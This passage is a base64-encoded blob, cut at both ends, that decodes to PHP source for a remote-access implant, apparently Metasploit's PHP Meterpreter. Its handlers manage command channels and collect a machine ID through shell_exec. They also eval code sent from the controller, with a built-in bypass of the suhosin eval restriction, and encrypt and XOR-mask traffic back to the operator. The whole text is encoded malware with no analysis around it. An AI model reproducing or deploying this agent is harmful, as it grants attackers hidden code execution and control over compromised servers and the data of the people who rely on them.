ORF9JRF9DT1JFX0NIQU5ORUxfUkVBRCk7IGZ1bmN0aW9uIGNvcmVfY2hhbm5lbF9yZWFkKCRyZXEsICYkcGt0KSB7IG15X3ByaW50KCJkb2luZyBjaGFubmVsIHJlYWQiKTsgJGNoYW5fdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ0hBTk5FTF9JRCk7ICRsZW5fdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfTEVOR1RIKTsgJGlkID0gJGNoYW5fdGx2Wyd2YWx1ZSddOyAkbGVuID0gJGxlbl90bHZbJ3ZhbHVlJ107ICRkYXRhID0gY2hhbm5lbF9yZWFkKCRpZCwgJGxlbik7IGlmICgkZGF0YSA9PT0gZmFsc2UpIHsgJHJlcyA9IEVSUk9SX0ZBSUxVUkU7IH0gZWxzZSB7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfQ0hBTk5FTF9EQVRBLCAkZGF0YSkpOyAkcmVzID0gRVJST1JfU1VDQ0VTUzsgfSByZXR1cm4gJHJlczsgfSB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjb3JlX2NoYW5uZWxfd3JpdGUnKSkgeyByZWdpc3Rlcl9jb21tYW5kKCdjb3JlX2NoYW5uZWxfd3JpdGUnLCBDT01NQU5EX0lEX0NPUkVfQ0hBTk5FTF9XUklURSk7IGZ1bmN0aW9uIGNvcmVfY2hhbm5lbF93cml0ZSgkcmVxLCAmJHBrdCkgeyAkY2hhbl90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9DSEFOTkVMX0lEKTsgJGRhdGFfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ0hBTk5FTF9EQVRBKTsgJGxlbl90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9MRU5HVEgpOyAkaWQgPSAkY2hhbl90bHZbJ3ZhbHVlJ107ICRkYXRhID0gJGRhdGFfdGx2Wyd2YWx1ZSddOyAkbGVuID0gJGxlbl90bHZbJ3ZhbHVlJ107ICR3cm90ZSA9IGNoYW5uZWxfd3JpdGUoJGlkLCAkZGF0YSwgJGxlbik7IGlmICgkd3JvdGUgPT09IGZhbHNlKSB7IHJldHVybiBFUlJPUl9GQUlMVVJFOyB9IGVsc2UgeyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0xFTkdUSCwgJHdyb3RlKSk7IHJldHVybiBFUlJPUl9TVUNDRVNTOyB9IH0gfSBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnY29yZV9jaGFubmVsX2Nsb3NlJykpIHsgcmVnaXN0ZXJfY29tbWFuZCgnY29yZV9jaGFubmVsX2Nsb3NlJywgQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfQ0xPU0UpOyBmdW5jdGlvbiBjb3JlX2NoYW5uZWxfY2xvc2UoJHJlcSwgJiRwa3QpIHsgZ2xvYmFsICRjaGFubmVsX3Byb2Nlc3NfbWFwOyBteV9wcmludCgiZG9pbmcgY2hhbm5lbCBjbG9zZSIpOyAkY2hhbl90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9DSEFOTkVMX0lEKTsgJGlkID0gJGNoYW5fdGx2Wyd2YWx1ZSddOyAkYyA9IGdldF9jaGFubmVsX2J5X2lkKCRpZCk7IGlmICgkYykgeyBjaGFubmVsX2Nsb3NlX2hhbmRsZXMoJGlkKTsgY2hhbm5lbF9yZW1vdmUoJGlkKTsgaWYgKGFycmF5X2tleV9leGlzdHMoJGlkLCAkY2hhbm5lbF9wcm9jZXNzX21hcCkgYW5kIGlzX2NhbGxhYmxlKCdjbG9zZV9wcm9jZXNzJykpIHsgY2xvc2VfcHJvY2VzcygkY2hhbm5lbF9wcm9jZXNzX21hcFskaWRdKTsgfSByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSBkdW1wX2NoYW5uZWxzKCJhZnRlciBjbG9zZSIpOyByZXR1cm4gRVJST1JfRkFJTFVSRTsgfSB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjaGFubmVsX2Nsb3NlX2hhbmRsZXMnKSkgeyBmdW5jdGlvbiBjaGFubmVsX2Nsb3NlX2hhbmRsZXMoJGNpZCkgeyBnbG9iYWwgJGNoYW5uZWxzOyBpZiAoIWFycmF5X2tleV9leGlzdHMoJGNpZCwgJGNoYW5uZWxzKSkgeyByZXR1cm47IH0gJGMgPSAkY2hhbm5lbHNbJGNpZF07IGZvcigkaSA9IDA7ICRpIDwgMzsgJGkrKykgeyBpZiAoYXJyYXlfa2V5X2V4aXN0cygkaSwgJGMpICYmIGlzX3Jlc291cmNlKCRjWyRpXSkpIHsgY2xvc2UoJGNbJGldKTsgcmVtb3ZlX3JlYWRlcigkY1skaV0pOyB9IH0gaWYgKHN0cmxlbigkY1snZGF0YSddKSA9PSAwKSB7IGNoYW5uZWxfcmVtb3ZlKCRjaWQpOyB9IH0gfSBmdW5jdGlvbiBjaGFubmVsX3JlbW92ZSgkY2lkKSB7IGdsb2JhbCAkY2hhbm5lbHM7IHVuc2V0KCRjaGFubmVsc1skY2lkXSk7IH0gaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2NvcmVfY2hhbm5lbF9pbnRlcmFjdCcpKSB7IHJlZ2lzdGVyX2NvbW1hbmQoJ2NvcmVfY2hhbm5lbF9pbnRlcmFjdCcsIENPTU1BTkRfSURfQ09SRV9DSEFOTkVMX0lOVEVSQUNUKTsgZnVuY3Rpb24gY29yZV9jaGFubmVsX2ludGVyYWN0KCRyZXEsICYkcGt0KSB7IGdsb2JhbCAkcmVhZGVyczsgbXlfcHJpbnQoImRvaW5nIGNoYW5uZWwgaW50ZXJhY3QiKTsgJGNoYW5fdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ0hBTk5FTF9JRCk7ICRpZCA9ICRjaGFuX3RsdlsndmFsdWUnXTsgJHRvZ2dsZV90bHYgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9CT09MKTsgJGMgPSBnZXRfY2hhbm5lbF9ieV9pZCgkaWQpOyBpZiAoJGMpIHsgaWYgKCR0b2dnbGVfdGx2Wyd2YWx1ZSddKSB7IGlmICghaW5fYXJyYXkoJGNbMV0sICRyZWFkZXJzKSkgeyBhZGRfcmVhZGVyKCRjWzFdKTsgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJGMpICYmICRjWzFdICE9ICRjWzJdKSB7IGFkZF9yZWFkZXIoJGNbMl0pOyB9ICRyZXQgPSBFUlJPUl9TVUNDRVNTOyB9IGVsc2UgeyAkcmV0ID0gRVJST1JfRkFJTFVSRTsgfSB9IGVsc2UgeyBpZiAoaW5fYXJyYXkoJGNbMV0sICRyZWFkZXJzKSkgeyByZW1vdmVfcmVhZGVyKCRjWzFdKTsgcmVtb3ZlX3JlYWRlcigkY1syXSk7ICRyZXQgPSBFUlJPUl9TVUNDRVNTOyB9IGVsc2UgeyAkcmV0ID0gRVJST1JfU1VDQ0VTUzsgfSB9IH0gZWxzZSB7IG15X3ByaW50KCJUcnlpbmcgdG8gaW50ZXJhY3Qgd2l0aCBhbiBpbnZhbGlkIGNoYW5uZWwiKTsgJHJldCA9IEVSUk9SX0ZBSUxVUkU7IH0gcmV0dXJuICRyZXQ7IH0gfSBmdW5jdGlvbiBpbnRlcmFjdGluZygkY2lkKSB7IGdsb2JhbCAkcmVhZGVyczsgJGMgPSBnZXRfY2hhbm5lbF9ieV9pZCgkY2lkKTsgaWYgKGluX2FycmF5KCRjWzFdLCAkcmVhZGVycykpIHsgcmV0dXJuIHRydWU7IH0gcmV0dXJuIGZhbHNlOyB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjb3JlX3NodXRkb3duJykpIHsgcmVnaXN0ZXJfY29tbWFuZCgnY29yZV9zaHV0ZG93bicsIENPTU1BTkRfSURfQ09SRV9TSFVURE9XTik7IGZ1bmN0aW9uIGNvcmVfc2h1dGRvd24oJHJlcSwgJiRwa3QpIHsgbXlfcHJpbnQoImRvaW5nIGNvcmUgc2h1dGRvd24iKTsgZGllKCk7IH0gfSBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnY29yZV9sb2FkbGliJykpIHsgcmVnaXN0ZXJfY29tbWFuZCgnY29yZV9sb2FkbGliJywgQ09NTUFORF9JRF9DT1JFX0xPQURMSUIpOyBmdW5jdGlvbiBjb3JlX2xvYWRsaWIoJHJlcSwgJiRwa3QpIHsgZ2xvYmFsICRpZDJmOyBteV9wcmludCgiZG9pbmcgY29yZV9sb2FkbGliIik7ICRkYXRhX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0RBVEEpOyBpZiAoKCRkYXRhX3RsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9DT01QUkVTU0VEKSA9PSBUTFZfTUVUQV9UWVBFX0NPTVBSRVNTRUQpIHsgcmV0dXJuIEVSUk9SX0ZBSUxVUkU7IH0gJHRtcCA9ICRpZDJmOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGRhdGFfdGx2Wyd2YWx1ZSddKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGRhdGFfdGx2Wyd2YWx1ZSddKTsgfSAkbmV3ID0gYXJyYXlfZGlmZigkaWQyZiwgJHRtcCk7IGZvcmVhY2ggKCRuZXcgYXMgJGlkID0+ICRmdW5jKSB7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfVUlOVCwgJGlkKSk7IH0gcmV0dXJuIEVSUk9SX1NVQ0NFU1M7IH0gfSBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnY29yZV9lbnVtZXh0Y21kJykpIHsgcmVnaXN0ZXJfY29tbWFuZCgnY29yZV9lbnVtZXh0Y21kJywgQ09NTUFORF9JRF9DT1JFX0VOVU1FWFRDTUQpOyBmdW5jdGlvbiBjb3JlX2VudW1leHRjbWQoJHJlcSwgJiRwa3QpIHsgbXlfcHJpbnQoImRvaW5nIGNvcmVfZW51bWV4dGNtZCIpOyBnbG9iYWwgJGlkMmY7ICRpZF9zdGFydF9hcnJheSA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX1VJTlQpOyAkaWRfc3RhcnQgPSAkaWRfc3RhcnRfYXJyYXlbJ3ZhbHVlJ107ICRpZF9lbmRfYXJyYXkgPSBwYWNrZXRfZ2V0X3RsdigkcmVxLCBUTFZfVFlQRV9MRU5HVEgpOyAkaWRfZW5kID0gJGlkX2VuZF9hcnJheVsndmFsdWUnXSArICRpZF9zdGFydDsgZm9yZWFjaCAoJGlkMmYgYXMgJGlkID0+ICRleHRfY21kKSB7IG15X3ByaW50KCJjb3JlX2VudW1leHRjbWQgLSBjaGVja2luZyAiIC4gJGV4dF9jbWQgLiAiIGFzICIgLiAkaWQpOyBsaXN0KCRleHRfbmFtZSwgJGNtZCkgPSBleHBsb2RlKCJfIiwgJGV4dF9jbWQsIDIpOyBpZiAoJGlkX3N0YXJ0IDwgJGlkICYmICRpZCA8ICRpZF9lbmQpIHsgbXlfcHJpbnQoImNvcmVfZW51bWV4dGNtZCAtIGFkZGluZyAiIC4gJGV4dF9jbWQgLiAiIGFzICIgLiAkaWQpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX1VJTlQsICRpZCkpOyB9IH0gcmV0dXJuIEVSUk9SX1NVQ0NFU1M7IH0gfSBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnY29yZV9zZXRfdXVpZCcpKSB7IHJlZ2lzdGVyX2NvbW1hbmQoJ2NvcmVfc2V0X3V1aWQnLCBDT01NQU5EX0lEX0NPUkVfU0VUX1VVSUQpOyBmdW5jdGlvbiBjb3JlX3NldF91dWlkKCRyZXEsICYkcGt0KSB7IG15X3ByaW50KCJkb2luZyBjb3JlX3NldF91dWlkIik7ICRuZXdfdXVpZCA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX1VVSUQpOyBpZiAoJG5ld191dWlkICE9IG51bGwpIHsgJEdMT0JBTFNbJ1VVSUQnXSA9ICRuZXdfdXVpZFsndmFsdWUnXTsgbXlfcHJpbnQoIk5ldyBVVUlEIGlzIHskR0xPQkFMU1snVVVJRCddfSIpOyB9IHJldHVybiBFUlJPUl9TVUNDRVNTOyB9IH0gZnVuY3Rpb24gZ2V0X2hkZF9sYWJlbCgpIHsgZm9yZWFjaCAoc2NhbmRpcignL2Rldi9kaXNrL2J5LWlkLycpIGFzICRmaWxlKSB7IGZvcmVhY2ggKGFycmF5KCJhdGEtIiwgIm1iLSIpIGFzICRwcmVmaXgpIHsgaWYgKHN0cnBvcygkZmlsZSwgJHByZWZpeCkgPT09IDApIHsgcmV0dXJuIHN1YnN0cigkZmlsZSwgc3RybGVuKCRwcmVmaXgpKTsgfSB9IH0gcmV0dXJuICIiOyB9IGZ1bmN0aW9uIGRlcl90b19wZW0oJGRlcl9kYXRhKSB7ICRwZW0gPSBjaHVua19zcGxpdChiYXNlNjRfZW5jb2RlKCRkZXJfZGF0YSksIDY0LCAiXG4iKTsgJHBlbSA9ICItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuIi4kcGVtLiItLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiI7IHJldHVybiAkcGVtOyB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjb3JlX25lZ290aWF0ZV90bHZfZW5jcnlwdGlvbicpKSB7IHJlZ2lzdGVyX2NvbW1hbmQoJ2NvcmVfbmVnb3RpYXRlX3Rsdl9lbmNyeXB0aW9uJywgQ09NTUFORF9JRF9DT1JFX05FR09USUFURV9UTFZfRU5DUllQVElPTik7IGZ1bmN0aW9uIGNvcmVfbmVnb3RpYXRlX3Rsdl9lbmNyeXB0aW9uKCRyZXEsICYkcGt0KSB7IGlmIChzdXBwb3J0c19hZXMoKSkgeyBteV9wcmludCgiQUVTIGZ1bmN0aW9uYWxpdHkgaXMgc3VwcG9ydGVkIik7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfU1lNX0tFWV9UWVBFLCBFTkNfQUVTMjU2KSk7ICRHTE9CQUxTWydBRVNfRU5BQkxFRCddID0gZmFsc2U7ICRHTE9CQUxTWydBRVNfS0VZJ10gPSByYW5kX2J5dGVzKDMyKTsgaWYgKGZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9wa2V5X2dldF9wdWJsaWMnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ29wZW5zc2xfcHVibGljX2VuY3J5cHQnKSkgeyBteV9wcmludCgiRW5jcnlwdGlvbiB2aWEgcHVibGljIGtleSBpcyBzdXBwb3J0ZWQiKTsgJHB1Yl9rZXlfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfUlNBX1BVQl9LRVkpOyBpZiAoJHB1Yl9rZXlfdGx2ICE9IG51bGwpIHsgJGtleSA9IG9wZW5zc2xfcGtleV9nZXRfcHVibGljKGRlcl90b19wZW0oJHB1Yl9rZXlfdGx2Wyd2YWx1ZSddKSk7ICRlbmMgPSAnJzsgb3BlbnNzbF9wdWJsaWNfZW5jcnlwdCgkR0xPQkFMU1snQUVTX0tFWSddLCAkZW5jLCAka2V5LCBPUEVOU1NMX1BLQ1MxX1BBRERJTkcpOyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0VOQ19TWU1fS0VZLCAkZW5jKSk7IHJldHVybiBFUlJPUl9TVUNDRVNTOyB9IH0gcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9TWU1fS0VZLCAkR0xPQkFMU1snQUVTX0tFWSddKSk7IH0gcmV0dXJuIEVSUk9SX1NVQ0NFU1M7IH0gfSBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnY29yZV9nZXRfc2Vzc2lvbl9ndWlkJykpIHsgcmVnaXN0ZXJfY29tbWFuZCgnY29yZV9nZXRfc2Vzc2lvbl9ndWlkJywgQ09NTUFORF9JRF9DT1JFX0dFVF9TRVNTSU9OX0dVSUQpOyBmdW5jdGlvbiBjb3JlX2dldF9zZXNzaW9uX2d1aWQoJHJlcSwgJiRwa3QpIHsgcGFja2V0X2FkZF90bHYoJHBrdCwgY3JlYXRlX3RsdihUTFZfVFlQRV9TRVNTSU9OX0dVSUQsICRHTE9CQUxTWydTRVNTSU9OX0dVSUQnXSkpOyByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjb3JlX3NldF9zZXNzaW9uX2d1aWQnKSkgeyByZWdpc3Rlcl9jb21tYW5kKCdjb3JlX3NldF9zZXNzaW9uX2d1aWQnLCBDT01NQU5EX0lEX0NPUkVfU0VUX1NFU1NJT05fR1VJRCk7IGZ1bmN0aW9uIGNvcmVfc2V0X3Nlc3Npb25fZ3VpZCgkcmVxLCAmJHBrdCkgeyBteV9wcmludCgiZG9pbmcgY29yZV9zZXRfc2Vzc2lvbl9ndWlkIik7ICRuZXdfZ3VpZCA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX1NFU1NJT05fR1VJRCk7IGlmICgkbmV3X2d1aWQgIT0gbnVsbCkgeyAkR0xPQkFMU1snU0VTU0lPTl9JRCddID0gJG5ld19ndWlkWyd2YWx1ZSddOyBteV9wcmludCgiTmV3IFNlc3Npb24gR1VJRCBpcyB7JEdMT0JBTFNbJ1NFU1NJT05fR1VJRCddfSIpOyB9IHJldHVybiBFUlJPUl9TVUNDRVNTOyB9IH0gaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2NvcmVfbWFjaGluZV9pZCcpKSB7IHJlZ2lzdGVyX2NvbW1hbmQoJ2NvcmVfbWFjaGluZV9pZCcsIENPTU1BTkRfSURfQ09SRV9NQUNISU5FX0lEKTsgZnVuY3Rpb24gY29yZV9tYWNoaW5lX2lkKCRyZXEsICYkcGt0KSB7IG15X3ByaW50KCJkb2luZyBjb3JlX21hY2hpbmVfaWQiKTsgaWYgKGlzX2NhbGxhYmxlKCdnZXRob3N0bmFtZScpKSB7ICRtYWNoaW5lX2lkID0gZ2V0aG9zdG5hbWUoKTsgfSBlbHNlIHsgJG1hY2hpbmVfaWQgPSBwaHBfdW5hbWUoJ24nKTsgfSAkc2VyaWFsID0gIiI7IGlmIChpc193aW5kb3dzKCkpIHsgJG91dHB1dCA9IHN0cnRvbG93ZXIoc2hlbGxfZXhlYygidm9sICVTWVNURU1EUklWRSUiKSk7ICRzZXJpYWwgPSBwcmVnX3JlcGxhY2UoJy8uKnNlcmlhbCBudW1iZXIgaXMgKFthLXowLTldezR9LVthLXowLTldezR9KS4qL3MnLCAnJDEnLCAkb3V0cHV0KTsgfSBlbHNlIHsgJHNlcmlhbCA9IGdldF9oZGRfbGFiZWwoKTsgfSBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX01BQ0hJTkVfSUQsICRzZXJpYWwuIjoiLiRtYWNoaW5lX2lkKSk7IHJldHVybiBFUlJPUl9TVUNDRVNTOyB9IH0gJGNoYW5uZWxzID0gYXJyYXkoKTsgZnVuY3Rpb24gcmVnaXN0ZXJfY2hhbm5lbCgkaW4sICRvdXQ9bnVsbCwgJGVycj1udWxsKSB7IGdsb2JhbCAkY2hhbm5lbHM7IGlmICgkb3V0ID09IG51bGwpIHsgJG91dCA9ICRpbjsgfSBpZiAoJGVyciA9PSBudWxsKSB7ICRlcnIgPSAkb3V0OyB9ICRjaGFubmVsc1tdID0gYXJyYXkoMCA9PiAkaW4sIDEgPT4gJG91dCwgMiA9PiAkZXJyLCAndHlwZScgPT4gZ2V0X3J0eXBlKCRpbiksICdkYXRhJyA9PiAnJyk7ICRpZCA9IGVuZChhcnJheV9rZXlzKCRjaGFubmVscykpOyBteV9wcmludCgiQ3JlYXRlZCBuZXcgY2hhbm5lbCAkaW4sIHdpdGggaWQgJGlkIik7IHJldHVybiAkaWQ7IH0gZnVuY3Rpb24gZ2V0X2NoYW5uZWxfaWRfZnJvbV9yZXNvdXJjZSgkcmVzb3VyY2UpIHsgZ2xvYmFsICRjaGFubmVsczsgaWYgKGVtcHR5KCRjaGFubmVscykpIHsgcmV0dXJuIGZhbHNlOyB9IGZvcmVhY2ggKCRjaGFubmVscyBhcyAkaSA9PiAkY2hhbl9hcnkpIHsgaWYgKGluX2FycmF5KCRyZXNvdXJjZSwgJGNoYW5fYXJ5KSkgeyBteV9wcmludCgiRm91bmQgY2hhbm5lbCBpZCAkaSIpOyByZXR1cm4gJGk7IH0gfSByZXR1cm4gZmFsc2U7IH0gZnVuY3Rpb24gJmdldF9jaGFubmVsX2J5X2lkKCRjaGFuX2lkKSB7IGdsb2JhbCAkY2hhbm5lbHM7IG15X3ByaW50KCJMb29raW5nIHVwIGNoYW5uZWwgaWQgJGNoYW5faWQiKTsgaWYgKGFycmF5X2tleV9leGlzdHMoJGNoYW5faWQsICRjaGFubmVscykpIHsgbXlfcHJpbnQoIkZvdW5kIG9uZSIpOyByZXR1cm4gJGNoYW5uZWxzWyRjaGFuX2lkXTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZnVuY3Rpb24gY2hhbm5lbF93cml0ZSgkY2hhbl9pZCwgJGRhdGEpIHsgJGMgPSBnZXRfY2hhbm5lbF9ieV9pZCgkY2hhbl9pZCk7IGlmICgkYyAmJiBpc19yZXNvdXJjZSgkY1swXSkpIHsgbXlfcHJpbnQoIi0tLVdyaXRpbmcgJyRkYXRhJyB0byBjaGFubmVsICRjaGFuX2lkIik7IHJldHVybiB3cml0ZSgkY1swXSwgJGRhdGEpOyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBmdW5jdGlvbiBjaGFubmVsX3JlYWQoJGNoYW5faWQsICRsZW4pIHsgJGMgPSAmZ2V0X2NoYW5uZWxfYnlfaWQoJGNoYW5faWQpOyBpZiAoJGMpIHsgJHJldCA9IHN1YnN0cigkY1snZGF0YSddLCAwLCAkbGVuKTsgJGNbJ2RhdGEnXSA9IHN1YnN0cigkY1snZGF0YSddLCAkbGVuKTsgaWYgKHN0cmxlbigkcmV0KSA+IDApIHsgbXlfcHJpbnQoIkhhZCBzb21lIGxlZnRvdmVyczogJyRyZXQnIik7IH0gaWYgKHN0cmxlbigkcmV0KSA8ICRsZW4gYW5kIGlzX3Jlc291cmNlKCRjWzJdKSBhbmQgJGNbMV0gIT0gJGNbMl0pIHsgJHJlYWQgPSByZWFkKCRjWzJdKTsgJGNbJ2RhdGEnXSAuPSAkcmVhZDsgJGJ5dGVzX25lZWRlZCA9ICRsZW4gLSBzdHJsZW4oJHJldCk7ICRyZXQgLj0gc3Vic3RyKCRjWydkYXRhJ10sIDAsICRieXRlc19uZWVkZWQpOyAkY1snZGF0YSddID0gc3Vic3RyKCRjWydkYXRhJ10sICRieXRlc19uZWVkZWQpOyB9IGlmIChzdHJsZW4oJHJldCkgPCAkbGVuIGFuZCBpc19yZXNvdXJjZSgkY1sxXSkpIHsgJHJlYWQgPSByZWFkKCRjWzFdKTsgJGNbJ2RhdGEnXSAuPSAkcmVhZDsgJGJ5dGVzX25lZWRlZCA9ICRsZW4gLSBzdHJsZW4oJHJldCk7ICRyZXQgLj0gc3Vic3RyKCRjWydkYXRhJ10sIDAsICRieXRlc19uZWVkZWQpOyAkY1snZGF0YSddID0gc3Vic3RyKCRjWydkYXRhJ10sICRieXRlc19uZWVkZWQpOyB9IGlmIChmYWxzZSA9PT0gJHJlYWQgYW5kIGVtcHR5KCRyZXQpKSB7IGlmIChpbnRlcmFjdGluZygkY2hhbl9pZCkpIHsgaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbCgkY1sxXSk7IH0gcmV0dXJuIGZhbHNlOyB9IHJldHVybiAkcmV0OyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBmdW5jdGlvbiByYW5kX3hvcl9ieXRlKCkgeyByZXR1cm4gY2hyKG10X3JhbmQoMSwgMjU1KSk7IH0gZnVuY3Rpb24gcmFuZF9ieXRlcygkc2l6ZSkgeyAkYiA9ICcnOyBmb3IgKCRpID0gMDsgJGkgPCAkc2l6ZTsgJGkrKykgeyAkYiAuPSByYW5kX3hvcl9ieXRlKCk7IH0gcmV0dXJuICRiOyB9IGZ1bmN0aW9uIHJhbmRfeG9yX2tleSgpIHsgcmV0dXJuIHJhbmRfYnl0ZXMoNCk7IH0gZnVuY3Rpb24geG9yX2J5dGVzKCRrZXksICRkYXRhKSB7ICRyZXN1bHQgPSAnJzsgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCRkYXRhKTsgKyskaSkgeyAkcmVzdWx0IC49ICRkYXRheyRpfSBeICRrZXl7JGkgJSA0fTsgfSByZXR1cm4gJHJlc3VsdDsgfSBmdW5jdGlvbiBnZW5lcmF0ZV9yZXFfaWQoKSB7ICRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzsgJHJpZCA9ICcnOyBmb3IgKCRwID0gMDsgJHAgPCAzMjsgJHArKykgeyAkcmlkIC49ICRjaGFyYWN0ZXJzW3JhbmQoMCwgc3RybGVuKCRjaGFyYWN0ZXJzKS0xKV07IH0gcmV0dXJuICRyaWQ7IH0gZnVuY3Rpb24gc3VwcG9ydHNfYWVzKCkgeyByZXR1cm4gZnVuY3Rpb25fZXhpc3RzKCdvcGVuc3NsX2RlY3J5cHQnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ29wZW5zc2xfZW5jcnlwdCcpOyB9IGZ1bmN0aW9uIGRlY3J5cHRfcGFja2V0KCRyYXcpIHsgJGxlbl9hcnJheSA9IHVucGFjaygiTmxlbiIsIHN1YnN0cigkcmF3LCAyMCwgNCkpOyAkZW5jcnlwdF9mbGFncyA9ICRsZW5fYXJyYXlbJ2xlbiddOyBpZiAoJGVuY3J5cHRfZmxhZ3MgPT0gRU5DX0FFUzI1NiAmJiBzdXBwb3J0c19hZXMoKSAmJiAkR0xPQkFMU1snQUVTX0tFWSddICE9IG51bGwpIHsgJHRsdiA9IHN1YnN0cigkcmF3LCAyNCk7ICRkZWMgPSBvcGVuc3NsX2RlY3J5cHQoc3Vic3RyKCR0bHYsIDI0KSwgQUVTXzI1Nl9DQkMsICRHTE9CQUxTWydBRVNfS0VZJ10sIE9QRU5TU0xfUkFXX0RBVEEsIHN1YnN0cigkdGx2LCA4LCAxNikpOyByZXR1cm4gcGFjaygiTiIsIHN0cmxlbigkZGVjKSArIDgpIC4gc3Vic3RyKCR0bHYsIDQsIDQpIC4gJGRlYzsgfSByZXR1cm4gc3Vic3RyKCRyYXcsIDI0KTsgfSBmdW5jdGlvbiBlbmNyeXB0X3BhY2tldCgkcmF3KSB7IGlmIChzdXBwb3J0c19hZXMoKSAmJiAkR0xPQkFMU1snQUVTX0tFWSddICE9IG51bGwpIHsgaWYgKCRHTE9CQUxTWydBRVNfRU5BQkxFRCddID09PSB0cnVlKSB7ICRpdiA9IHJhbmRfYnl0ZXMoMTYpOyAkZW5jID0gJGl2IC4gb3BlbnNzbF9lbmNyeXB0KHN1YnN0cigkcmF3LCA4KSwgQUVTXzI1Nl9DQkMsICRHTE9CQUxTWydBRVNfS0VZJ10sIE9QRU5TU0xfUkFXX0RBVEEsICRpdik7ICRoZHIgPSBwYWNrKCJOIiwgc3RybGVuKCRlbmMpICsgOCkgLiBzdWJzdHIoJHJhdywgNCwgNCk7IHJldHVybiAkR0xPQkFMU1snU0VTU0lPTl9HVUlEJ10gLiBwYWNrKCJOIiwgRU5DX0FFUzI1NikgLiAkaGRyIC4gJGVuYzsgfSAkR0xPQkFMU1snQUVTX0VOQUJMRUQnXSA9IHRydWU7IH0gcmV0dXJuICRHTE9CQUxTWydTRVNTSU9OX0dVSUQnXSAuIHBhY2soIk4iLCBFTkNfTk9ORSkgLiAkcmF3OyB9IGZ1bmN0aW9uIHdyaXRlX3Rsdl90b19zb2NrZXQoJHJlc291cmNlLCAkcmF3KSB7ICR4b3IgPSByYW5kX3hvcl9rZXkoKTsgd3JpdGUoJHJlc291cmNlLCAkeG9yIC4geG9yX2J5dGVzKCR4b3IsIGVuY3J5cHRfcGFja2V0KCRyYXcpKSk7IH0gZnVuY3Rpb24gaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbCgkcmVzb3VyY2UpIHsgZ2xvYmFsICRtc2dzb2NrOyBpZiAoIWlzX3Jlc291cmNlKCRyZXNvdXJjZSkpIHsgcmV0dXJuOyB9ICRjaWQgPSBnZXRfY2hhbm5lbF9pZF9mcm9tX3Jlc291cmNlKCRyZXNvdXJjZSk7IGlmICgkY2lkID09PSBmYWxzZSkgeyBteV9wcmludCgiUmVzb3VyY2UgaGFzIG5vIGNoYW5uZWw6IHskcmVzb3VyY2V9Iik7IHJlbW92ZV9yZWFkZXIoJHJlc291cmNlKTsgY2xvc2UoJHJlc291cmNlKTsgfSBlbHNlIHsgbXlfcHJpbnQoIkhhbmRsaW5nIGRlYWQgcmVzb3V